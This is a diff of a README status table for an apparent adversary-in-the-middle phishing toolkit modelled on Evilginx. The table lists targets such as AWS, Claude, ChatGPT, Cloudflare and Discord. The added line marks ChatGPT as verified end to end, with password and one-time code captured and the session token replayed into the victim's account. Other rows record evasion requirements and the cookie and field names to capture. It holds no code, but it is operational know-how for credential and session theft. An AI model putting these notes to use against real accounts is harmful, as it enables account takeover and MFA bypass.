@@ -46,7 +46,7 @@ re-implementing Evilginx Pro-class features for internal / air-gapped environmen
 | `yandex` | ⚠️ unverified | Landing `/auth/` currently bounces to 360.yandex.com; React login fields need re-checking with an account |
 | `aws` | ⚠️ unverified | AWS WAF 403s datacenter IPs at `/signin`; fields `username`/`password`/`mfaCode` |
 | `claude` | ✅ **verified E2E** | Login-code flow (email + 6-digit code, no password), JSON creds; `sessionKey` captured and replayed into a logged-in session; CF-protected — requires `proxy: true` + residential + `tlsfp: chrome` |
-| `chatgpt` | ⚠️ unverified | Cloudflare + Auth0 flow (`auth.openai.com/u/login/password`); session `__Secure-next-auth.session-token` |
+| `chatgpt` | ✅ **verified E2E** | Password + OTP captured as JSON; chunked session-token `.0/.1` replayed into the victim's logged-in ChatGPT; CF + auth-cdn CORS trap documented |
 | `cloudflare` | ⚠️ unverified | Dashboard login behind the CF challenge; fields `email`/`password`, session `CF_Authorization` |
 | `discord` | ⚠️ unverified | SPA proxied (login renders); JSON creds `login`/`password` + TOTP `code`; bearer token in localStorage — credentials capture only |
 | `akamai` | ⚠️ unverified | Control Center auth renders through the proxy; session cookie set needs an account test |
